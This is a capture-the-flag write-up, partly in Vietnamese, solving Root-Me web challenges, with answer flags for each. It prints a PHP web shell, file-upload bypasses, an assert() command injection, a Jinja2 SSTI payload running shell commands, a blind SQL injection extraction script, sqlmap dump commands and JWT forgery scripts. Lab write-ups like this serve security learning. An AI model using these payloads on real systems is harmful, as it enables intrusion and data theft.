- [HTML - Source code](#html---source-code)
- [HTTP - IP restriction bypass](#http---ip-restriction-bypass)
- [HTTP - Open redirect](#http---open-redirect)
- [HTTP - User-agent](#http---user-agent)
- [Weak password](#weak-password)
- [PHP - Command injection](#php---command-injection)
- [Backup file](#backup-file)
- [HTTP - Directory indexing](#http---directory-indexing)
- [HTTP - Headers](#http---headers)
- [HTTP - POST](#http---post)
- [HTTP - Improper redirect](#http---improper-redirect)
- [HTTP - Verb tampering](#http---verb-tampering)
- [Install files](#install-files)
- [CRLF](#crlf)
- [File upload - Double extensions](#file-upload---double-extensions)
- [File upload - MIME type](#file-upload---mime-type)
- [HTTP - Cookies](#http---cookies)
- [Insecure Code Management](#insecure-code-management)
- [JSON Web Token (JWT) - Introduction](#json-web-token-jwt---introduction)
- [Directory traversal](#directory-traversal)
- [File upload - Null byte](#file-upload---null-byte)
- [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt---weak-secret)
- [JWT - Revoked token](#jwt---revoked-token)
- [PHP - assert()](#php---assert)
  - [Description](#description)
  - [Solution](#solution)
- [PHP - Filters](#php---filters)
  - [Solution](#solution-1)
- [PHP - register globals](#php---register-globals)
  - [Description](#description-1)
  - [Solution](#solution-2)
- [Python - Server-side Template Injection Introduction](#python---server-side-template-injection-introduction)
  - [Description](#description-2)
  - [Solution](#solution-3)
- [SQL injection - Blind](#sql-injection---blind)
  - [Solution 1](#solution-1)
  - [Solution 2: sqlmap](#solution-2-sqlmap)
- [JSON Web Token (JWT) - Public key](#json-web-token-jwt---public-key)
  - [Description](#description-3)
  - [Solution](#solution-4)

# HTML - Source code
pass: nZ^&@q5&sjJHev0
# HTTP - IP restriction bypass
use **X-Forwarded-For header** to trick server with internal ip addr

pass: Ip_$po0Fing
# HTTP - Open redirect
go to another page than the other which are displayed in the source code

pass: e6f8a530811d5a479812d7b82fc1a5c5
# HTTP - User-agent
As the title, Change **User-Agent** to admin

pass: rr$Li9%L34qd1AAe27
# Weak password
This is kinda guessy challenge, but i dont wanna guess so i decide to **BRUTE** it ^^

First capture the header and the boday with **burp**

![image info](img/271810551_242364731407511_8256775808442882487_n.png)

So the payload that we request to web page is convert to base64 and place in the Authorization header

**(The HTTP Authorization request header can be used to provide credentials that authenticate a user agent with a server, allowing access to a protected resource.)** 

so i write a script to convert default credentials to base64 and use FFUF to brute force (script in the folder)

![image info](img/271719231_990489488219350_4169317159863269556_n.png)

pass:admin 

(I think if I guess the credentials, maybe I'll finish sooner :v)

# PHP - Command injection
pass: S3rv1ceP1n9Sup3rS3cure
# Backup file
Content discovery (use dirsearch)

pass: OCCY9AcNm1tj
# HTTP - Directory indexing
Content discovery 

pass: Linux
# HTTP - Headers
change the header (script in folder)

pass: HeadersMayBeUseful
# HTTP - POST
As the title, use request method:POST to send data (script in folder)

pass: H7tp_h4s_N0_s3Cr37S_F0r_y0U

# HTTP - Improper redirect
The web page is automatically add redirect param to the url because of the Location header

```
http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect
```

**The Location response header indicates the URL to redirect a page to. It only provides a meaning when served with a 3xx (redirection) or 201 (created) status response.)**

Solution: add 
```
allow_redirects=False
```
to the request (script in the folder)

pass: ExecutionAfterRedirectIsBad

# HTTP - Verb tampering
My first idea is tried the script and the payload i had done earlier chall but no working, so i have to rethink about this chall. i note that the title is **Verb tampering** so the ideal here is change the request method to anything other than GET.

pass: ```a23e$dme96d3saez$$prap```

# Install files
According to the title, the admin of this page uses phpbb (i dont know what it is) and he forget to delete his install folder, so the idea this to find it

Location: **/phpbb/install/**

pass: karambar

# CRLF
(Carriage return and Line Feed) it means to create new lines (\r\n).
So the idea is to use intercept proxy (e.g. Burp suite) edit request to
```
GET /web-serveur/ch14/?username=%0D%0Aadmin%20authenticated%0D%0INJECTINHERE
```
# File upload - Double extensions
The idea is upload our script and rce. 
(i have tried reverse shell with netcat and ngrok to port fowarding but somehow it didnt work LOL so i use this script from another write up)
```
<?php

$data = system($_GET["cmd"]);
echo $data;

?>
```
now change this to reverse.php.png to bypass the image filter and the final step is rce with cmd param
```
challenge01.root-me.org/web-serveur/ch20/galerie/upload/0c3f5ea659f03569d6fce99cf1233c56/test.php.png?cmd=cat%20../../../.passwd
```
pass: Gg9LRz-hWSxqqUKd77-_q-6G8

# File upload - MIME type
(Kiểu phương tiện là định danh hai phần cho định dạng file và nội dung định dạng được truyền trên Internet.)

So idea here is use Burp to change the header **Content-type**  from **aplication/octet-stream** to **image/png**. Ok now we can upload our script successfully

pass: a7n4nizpgQgnPERy89uanf6T4

# HTTP - Cookies
Use burp to catch request and change the cookie from **visiteur** to **admin**

pass: ml-SYMPA 
# Insecure Code Management
(use Gittools)

pass: s3cureP@ssw0rd

# JSON Web Token (JWT) - Introduction
first, let's capture the request and respone with burp

![image info](img/248008306_329979162475483_3939972177496919035_n.png)

So as the title, the idea here is to change the jwt token to bypass this page. Let's use jwt.io ([here](https://jwt.io/)) to decode this jwt token.

![image info](img/271772730_708851527148236_2564623737749867392_n.png)

So we can change the algorithm from **HS256** to **none** and delete the signature key at the end (because **none** alg doesnt need that key). After doing that, we encode that token to base64 and send it to get the password

pass: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7

# Directory traversal

Cái title đã gợi ý lỗ hổng cho rùi, mình sẽ dùng param galerie để khai thác lỗ hổng, thử enumerate bằng payload này: "**.**" xem sao 

```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=.
```

![img](img/Screenshot%20from%202022-02-07%2019-31-42.png)

Yeh và nó đã liệt kê hết các dict trong dict galerie, trong đó có thư mục 86hwnX2r là cần lưu ý, giờ chui vào thoi, làm cũng tuơng tự như trên

```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=.
```

![img](img/Screenshot%20from%202022-02-07%2019-36-59.png)

yay và cuối cùng truy cập lấy flag thôi

flag: kcb$!Bx@v4Gs9Ez
# File upload - Null byte
Upload thử đoạn script từ chall 14 với png filter xem ntn

![img](img/Screenshot%20from%202022-02-07%2019-53-29.png) 

Tận dụng hint từ title, mình sẽ thêm cái Null byte vào cuối để bypass filter, mình sẽ thử đặt nó ở vài chỗ như:

* 1 upload%00.php.png
* 2 upload.php%00.png
* 3 upload.php.png%00

(À mình đặt bằng cách dùng burp chặn post request và thêm ở đấy  )

![img](img/Screenshot%20from%202022-02-07%2019-59-34.png)

và có vẻ là cái thứ 2 đã upload thành công

![img](img/Screenshot%20from%202022-02-07%2020-00-07.png)

Giờ truy cập vào file upload đấy và rce qua param cmd thôi

flag: YPNchi2NmTwygr2dgCCF 

# JSON Web Token (JWT) - Weak secret
![image](./img/Screenshot%20from%202022-02-26%2014-40-44.png)

như message thì ta sẽ có dc token khi truy cập vào /token/ , và sẽ phỉa dùng token đấy để truy cập vào /admin/

![img](./img/Screenshot%20from%202022-02-26%2014-45-53.png)

lần này mình ko thể dùng cách chuyển alg về none dc nữa r, mà sẽ phỉa crack để có đc signature, trong chall này mình sẽ dùng tool ``crackjwt.py``

```
./crackjwt.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw" ~/SecLists/rockyou.txt                    ─╯
Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
18741it [00:00, 39596.39it/s]
Found secret key: lol
```

bingo giờ này cái key này rồi chỉnh jwt phần payload sang admin là xong

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA" -X POST http://challenge01.root-me.org/web-serveur/ch59/admin
{"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"}
```

# JWT - Revoked token
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route("/web-serveur/ch63/")
def index():
    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)
```

Đây chall đầu tiên của rootme mà mình chơi nó cho xem source code. (dạng này thì mình hơi non tay @@). 

Sau khi ngẫm nghĩ 1 hồi cái source thì đại khái nó là khi mình login thành công với đúng định dạng json ``{"username":"admin","password":"admin"}`` thì nó sẽ trả về cái token ( đồng thời cái token này cũng bị đưa vào blacklist) và nhiệm vụ của mình là dùng cái token đó để truy cập đuợc vào admin để lấy flag

```
job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
```

Ở hàm main có 1 cái job gọi đến cái def  ``delete_expired_tokens():`` mỗi 10s. Hàm def này sẽ thực hiện decode cái jwt thông qua jwt.decode, nếu gặp phải exception thì sẽ add vào set ``to_remove`` và thực hiện so sanh với blacklist thông qua func difference().

Khi access vào admin, nó sẽ kiểm tra header Authorization để check xem cái jwt đó nó có hợp lệ hay không và có nằm trong blacklist hay không. Vậy làm thế nào để có thể bypass cái này khi mà vừa xác thực thành công thì JWT đã bị đưa vào blacklist. 

Vậy solution ở đây sẽ là thay đổi signature key mà không làm thay đổi nội dung của nó :v . Nhắc lại token jwt đưọc tạo như sau:

```
const token = base64urlEncoding(header) + '.' + base64urlEncoding(payload) + '.' + base64urlEncoding(signature)
```

Có kha khá trick để thay để signature để khi mà decode base64 ra thì nội dung nó vẫn thế ( nhưng mà tạo sao chỉ đc thay đổi signature thôi ? Bởi vì signature đưọc tạo ra gồm bởi header,payload,secret(optional) và alg, nếu thay đổi header or payload -> new signature)

Ở đây ta có thể thêm = vào cuối vì khi decode b64 nó sẽ trả về giống nhau.

Ngoài ra, mình có thể generate cái token đến khi nào phần signature key có ``-``, và mình sẽ thực hiện thay đổi nó thành ``/`` (bởi vì ``-`` và ``/`` sau khi decode b64 sẽ trả về kqua giống nhau) 

```
#!python3

import string
import requests
url='http://challenge01.root-me.org/web-serveur/ch63/'
data1={"username":"admin","password":"admin"}
while True:
    r=requests.post(url+'login',json=data1).text
    a=r[17:len(r)-3:].split('.')
    if "_" in a[2]:
        a[2]=a[2].replace('_','/')
        string='.'.join(a)
        header={"Authorization": "Bearer " + string}
        res=requests.get(url+'admin',headers=header).text
        print(res)
        break
```

flag: Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld

# PHP - assert()
## Description
Find and exploit the vulnerability to read the file .passwd.
## Solution
Nhìn qua url là biết đây là bị lỗi LFI thông qua param ``page``. Thử nhẹ payload ``../../../etc/passwd`` xem thế nào.

![img](./img/Screenshot%20from%202022-02-26%2014-40-44.png)

hmm.. assert và strpos, theo như [hacktrick](https://book.hacktricks.xyz/pentesting-web/file-inclusion) thì có vẻ như filter để ngăn exploit lfi của chall này là : ``assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");`` và ta có thể bypass bằng payload ``' and die(system("ls -lsa")) or '``

![img](./img/Screenshot%20from%202022-02-27%2016-13-23.png)

Đọc file ``.passwd`` và lấy flag thoi

flag: x4Ss3rT1nglSn0ts4f3A7A1Lx

# PHP - Filters
## Solution
Đây cũng là 1 chall về LFI, nma lần này theo như hint đề bài thì sẽ phải bypass thông qua ``PHP wrappers`` rồi. payload sẽ có dạng: ``?inc=php://filter/convert.base64-encode/resource=index.php``. Mỗi trang lần luợt lại include vs required đến trang tiếp theo, mình cứ tìm lần lưọt đến khi đến trang ``config.php``.

![img](./img/Screenshot%20from%202022-02-27%2016-21-23.png)

Lấy cái credential đó submit và lấy flag thoy.

flag: DAPt9D2mky0APAF

# PHP - register globals
## Description
It seems that the developper often leaves backup files around...
## Solution
Chall này nói về 1 lỗi đã từng phổ biến chính là set ``register_globals= on``. Khi này các attacker có thể inject các script với tất cả các loại biến như biến yêu cầu từ html forms. (nó đã đc để chế đệ off default từ bản ``4.2.0``). Ex:

![img](./img/Screenshot%20from%202022-02-27%2016-28-20.png)

như hint từ description, mình sẽ dùng dirsearch để tìm những backup mà nó để quên. ``index.php.bak`` were founded !!. Trong đây có 1 đoạn khá thú vị

```
if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}
```

Mình có thể trigger ``$hidden_password`` khi mà set ``$_SESSION["logged"]=1``

![img](./img/Screenshot%20from%202022-02-27%2016-34-18.png)

# Python - Server-side Template Injection Introduction
## Description
This service allows you to generate a web page. Use it to read the flag!
## Solution
Đây là chall đầu tiên của mình làm về SSTI nên là hơi non tay (đây là 1 dạng vul mà attacker có thể sử dụng các ``native template syntax ``  để chèn cái payload mã độc vào cái template đó, sau đó nó sẽ đưọc thực thi bên server-side). 
EX: 
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```

Đầu tiên thì tất nhiên test thử luôn cái payload nổi tiếng ``{{7*'7'}}`` để detect cái vul này. 

![img](./img/Screenshot%20from%202022-02-28%2008-48-50.png)

Ref: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

Payload: ``{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat .passwd').read() }}``

flag: Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!

# SQL injection - Blind
## Solution 1
![img](./img/1.png)

Như hint từ title thì có vẻ đây là 1 chall về dạng Blind Injection cụ thể là Boolen based. Trước tiên mình sẽ thử trigger lỗi bằng 1 số kí tự đặc biệt

Payload: ``username=1’abc&password=1``

![img](./img/2.png)

Nó đã trả về cho mình kết quả là một lỗi về SQLite3. Xác định được DBMS, mình tiếp tục thử 1 số payload cổ điển như

Payload: ``1' or 1=1 -- -``

![img](./img/3.png)

Có vẻ payload đã được thực thi thành công, giờ thử extract xem có bao nhiêu cột

Payload ``user1' UNION select null,null,null-- -``

![img](./img/4.png)

Ồ Nô, bị filter mất rùi, mình không thử sử dụng lệnh UNION để khai thác nữa . Nhưng không sao không sao, vẫn còn nhiều cách khác, trước tiên mình cần phỉa xác định độ dài và tên của table thông qua ``sqlite_master`` , đây đuợc coi là master table giữ thông tin quan trọng về các bảng trong database.

Payload:
```
user1' and (SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('{c}') -- -
```
Bời vì đây là blind injection, tức là kết quả trả về chỉ cho mình biết payload của mình có thành công hay không, vậy mình đã viết script để brute force với cái payload trên cụ thể là so sánh từng kí tự dưới dạng hex với từng kí tự của ``tbl_name`` trong ``sql_master``

Payload:
```
admin' and substr((select password from users where (username='admin')),{i},1)='{c}'--
```
Script:
```
#!python3
import requests
import string
sess=requests.Session()
url='http://challenge01.root-me.org/web-serveur/ch10/'
payload=string.printable
passwd=''   
i=1
while True:
    for c in payload:
        # Extract ra ten cua table
        # table={
        #     'username':f"user1' and (SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('{c}') -- -",
        #     'password':'pass'
        # }
 
        # Extract ra password cua admin
        data={
            'username':f"admin' and substr((select password from users where (username='admin')),{i},1)='{c}'--",
            'password':'pass'
        }
        r=sess.post(url,data=data)
        if "Welcome back" in r.text:
            passwd+=c
            i+=1
            print(passwd)
            break
```
![img](./img/5.png)

## Solution 2: sqlmap
Biết được param để exploit và DMBS ta có thể sử dụng 1 tool khá phổ biến để test lỗ hổng SQLi đó là ``sqlmap`` . Trước tiên là extract ra tên của tables.

link: https://github.com/sqlmapproject/sqlmap

```
./sqlmap.py --dbms=SQLite --data='username=FUZZ&password=FUZZ' --tables -u "challenge01.root-me.org/web-serveur/ch10/"
```
![img](./img/6.png)

Tiếp theo là extract ra tên và số cột trong ``users``

```
./sqlmap.py --dbms=SQLite -D SQLite_masterdb -T users --columns --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/"
```

![img](./img/7.png)

yay, đã có đủ hết mọi dữ kiện cần thiết, giờ thì dump hết ra thoi

```
./sqlmap.py --dbms=SQLite -D SQLite_masterdb -T users -C "username","password","Year" --dump --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/"
```

![img](./img/8.png)

# JSON Web Token (JWT) - Public key
## Description
You find an API with 3 endpoints:

1. /key (accessible with GET)
2. /auth (accessible with POST)
3. /admin (accessible with POST)

There is sure to be important data in the admin section, access it!

## Solution
như description: 
1. ``/key`` cho mình public key
2. ``/auth`` cho mình 1 jwt với thuật toán ``RS256``

![img](./img/9.png)

3. vì đã biết public key --> chuyển mã hóa từ RS256 sang HS256

note:
```
Nếu chuyển từ RS256 sang HS256 thì signature sẽ được verify bằng public key của HS256. khi đã thay đổi thuật toán mã hoá sang HS256, vì lúc này secret key tương đương với public key mà mình có được, chỉ cần sign signature bằng key mà mình có được, ứng dụng hệ thống sẽ verify trên public key nên sẽ có thể dễ dàng bypass được JWT verification.
```

script (use [pyjwt](https://github.com/jpadilla/pyjwt)):
```
#!python3
import requests
import jwt

s=requests.session()
url='http://challenge01.root-me.org/web-serveur/ch60/'
key=s.get(url+'key').json()
key="\n".join(key)+"\n"

token=jwt.encode({"username":"admin"}, key=key,algorithm='HS256')

r2=s.post(url+'admin', headers={'Authorization': 'Bearer ' + token.decode()}) 
print(r2.text)
```

![img](./img/10.png)

